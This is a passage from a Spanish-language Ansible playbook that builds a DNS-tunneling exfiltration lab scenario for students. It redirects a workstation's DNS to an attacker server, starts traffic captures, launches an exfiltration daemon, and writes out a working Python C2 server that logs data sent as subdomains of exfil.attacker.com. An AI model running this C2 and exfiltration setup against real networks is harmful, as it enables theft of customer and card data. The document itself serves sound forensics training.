      when: inventory_hostname == "workstation"

    - name: Configurar DNS en workstation para usar servidor del atacante
      blockinfile:
        path: /etc/resolv.conf
        marker: "# {mark} EXFIL DNS"
        insertafter: EOF
        block: |
          # Forzar uso de DNS interno para exfiltracion
          nameserver 10.10.2.10
      when: inventory_hostname == "workstation"

    # =========================================================
    # CONFIGURAR CAPTURAS DE TRAFICO
    # =========================================================
    - name: Iniciar captura de trafico DNS en domaincontroller
      command: >
        tcpdump -i any port 53 -w /var/log/traffic_captures/dns_dc_{{ ansible_date_time.epoch }}.pcap
      async: 600
      poll: 0
      ignore_errors: yes
      when: inventory_hostname == "domaincontroller"

    - name: Iniciar captura de trafico en workstation
      command: >
        tcpdump -i any port 53 -w /var/log/traffic_captures/dns_ws_{{ ansible_date_time.epoch }}.pcap
      async: 600
      poll: 0
      ignore_errors: yes
      when: inventory_hostname == "workstation"

    # =========================================================
    # SIMULAR RESPUESTAS C2 DESDE EL SERVIDOR DEL ATACANTE
    # =========================================================
    - name: Crear script de respuesta C2
      copy:
        content: |
          #!/usr/bin/env python3
          """
          Simula el servidor C2 que responde a consultas DNS de exfiltracion
          """
          import socket
          import struct
          import threading
          import time
          from datetime import datetime
          
          class C2Server:
              def __init__(self, listen_ip="0.0.0.0", port=53):
                  self.listen_ip = listen_ip
                  self.port = port
                  self.received_data = []
                  self.query_log = "/root/exfil_logs/received_data.log"
              
              def parse_dns_query(self, data):
                  """Parse simple de consulta DNS"""
                  try:
                      # Saltar header DNS (12 bytes)
                      questions = data[12:]
                      
                      # Leer nombre de dominio
                      domain_parts = []
                      i = 0
                      while i < len(questions) and questions[i] != 0:
                          length = questions[i]
                          domain_parts.append(questions[i+1:i+1+length].decode('ascii', errors='ignore'))
                          i += 1 + length
                      
                      full_domain = '.'.join(domain_parts)
                      return full_domain
                  except Exception as e:
                      return None
              
              def create_dns_response(self, query_data, response_text="RECEIVED"):
                  """Crea una respuesta DNS con TXT record"""
                  # Construir respuesta DNS basica
                  txid = query_data[:2]
                  flags = b'\x81\x80'  # Standard response, no error
                  qdcount = query_data[4:6]
                  ancount = b'\x00\x01'  # 1 answer
                  nscount = b'\x00\x00'
                  arcount = b'\x00\x00'
                  
                  header = txid + flags + qdcount + ancount + nscount + arcount
                  question = query_data[12:]
                  
                  # TXT record response
                  txt_data = response_text.encode('ascii')
                  txt_length = len(txt_data)
                  
                  answer = (
                      b'\xc0\x0c'  # Name pointer
                      b'\x00\x10'  # Type TXT
                      b'\x00\x01'  # Class IN
                      b'\x00\x00\x0e\x10'  # TTL 3600
                      struct.pack('>H', txt_length + 1)  # RDLENGTH
                      bytes([txt_length])  # TXT length
                      + txt_data
                  )
                  
                  return header + question + answer
              
              def handle_query(self, data, addr):
                  """Procesa una consulta DNS recibida"""
                  domain = self.parse_dns_query(data)
                  
                  if domain and "exfil.attacker.com" in domain:
                      # Extraer datos del subdominio
                      subdomain = domain.replace(".exfil.attacker.com", "")
                      
                      timestamp = datetime.now().isoformat()
                      log_entry = f"{timestamp} | {addr[0]} | {domain} | subdomain_length={len(subdomain)}"
                      
                      # Registrar en log
                      with open(self.query_log, 'a') as f:
                          f.write(log_entry + '\n')
                      
                      # Almacenar datos recibidos
                      self.received_data.append({
                          "timestamp": timestamp,
                          "source_ip": addr[0],
                          "domain": domain,
                          "subdomain": subdomain
                      })
                      
                      print(f"[{timestamp}] Received from {addr[0]}: {domain[:50]}...")
                  
                  # Enviar respuesta
                  response = self.create_dns_response(data)
                  return response
              
              def run(self):
                  """Ejecuta el servidor C2"""
                  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  sock.bind((self.listen_ip, self.port))
                  
                  print(f"[*] C2 Server listening on {self.listen_ip}:{self.port}")
                  print(f"[*] Logging to {self.query_log}")
                  
                  while True:
                      try:
                          data, addr = sock.recvfrom(512)
                          response = self.handle_query(data, addr)
                          sock.sendto(response, addr)
                      except Exception as e:
                          print(f"[!] Error: {e}")
          
          if __name__ == "__main__":
              server = C2Server()
              server.run()
        dest: /root/c2_server.py
        owner: root
        group: root
        mode: '0755'
      when: inventory_hostname == "attacker"

    # =========================================================
    # INICIAR EL ATAQUE (DELAYED TO ALLOW SETUP)
    # =========================================================
    - name: Iniciar daemon de exfiltracion en workstation
      command: nohup bash /home/student/exfil_daemon.sh &
      async: 600
      poll: 0
      ignore_errors: yes
      when: inventory_hostname == "workstation"

    - name: Iniciar servidor C2 en atacante
      command: nohup python3 /root/c2_server.py > /root/c2_output.log 2>&1 &
      async: 600
      poll: 0
      ignore_errors: yes
      when: inventory_hostname == "attacker"

    # =========================================================
    # REGISTRAR ESTADO DEL ESCENARIO
    # =========================================================
    - name: Crear archivo de estado del escenario
      copy:
        content: |
          ESCENARIO 05: EXFILTRACION VIA DNS TUNNELING
          =============================================
          Estado: ACTIVO
          Inicio: {{ ansible_date_time.iso8601 }}
          
          RESUMEN:
          - Servidor DNS del atacante configurado y operativo en 10.10.0.10
          - Script de DNS tunneling instalado en workstation (10.10.2.100)
          - Daemon de exfiltracion ejecutandose cada 5 minutos
          - Base de datos de clientes configurada en database (10.10.2.40)
          - Documentos confidenciales en fileserver (10.10.2.30)
          - Capturas de trafico DNS activas
          - Servidor C2 recibiendo datos exfiltrados
          
          DATOS OBJETIVO:
          - Registros de 10 clientes (DNI, nombre, cuenta, saldo)
          - 5 tarjetas de credito con datos completos
          - 10 transacciones bancarias
          - 7 documentos confidenciales
          
          METODO:
          - DNS tunneling con subdominios codificados en base64
          - Chunk size: 60 bytes por consulta
          - Intervalo: 2-5 segundos entre consultas
          - Dominio de exfiltracion: exfil.attacker.com
          - Canal C2: registros TXT
          
          LOGS:
          - Exfiltracion: /var/log/exfil_queries.log (workstation)
          - C2: /root/exfil_logs/received_data.log (attacker)
          - DNS: /var/log/bind/query.log (domaincontroller)
          - Capturas: /var/log/traffic_captures/ (workstation, domaincontroller)
          
          Para los estudiantes:
          - Inicie analisis desde la workstation comprometida
          - Revise los logs DNS en el domaincontroller
          - Analice las capturas de trafico con tshark/wireshark
          - Identifique las consultas anomalas y decodifique los datos
        dest: /root/escenario_estado.txt
        owner: root
        group: root
        mode: '0644'
      when: inventory_hostname in ["attacker", "workstation"]

    - name: Mostrar resumen de configuracion
      debug:
        msg: >
          [{{ inventory_hostname }}] Configuracion completada.
          {% if inventory_hostname == "attacker" %}
          Servidor C2 activo en puerto 53. Logs en /root/exfil_logs/
          {% elif inventory_hostname == "workstation" %}
          Script de exfiltracion instalado. Daemon ejecutandose cada 5 minutos.
          {% elif inventory_hostname == "database" %}
          Base de datos de prueba cargada con datos de clientes y tarjetas.
          {% elif inventory_hostname == "fileserver" %}
          Documentos confidenciales creados en shares SMB.
          {% elif inventory_hostname == "domaincontroller" %}
          DNS logging habilitado. Captura de trafico activa.
          {% endif %}
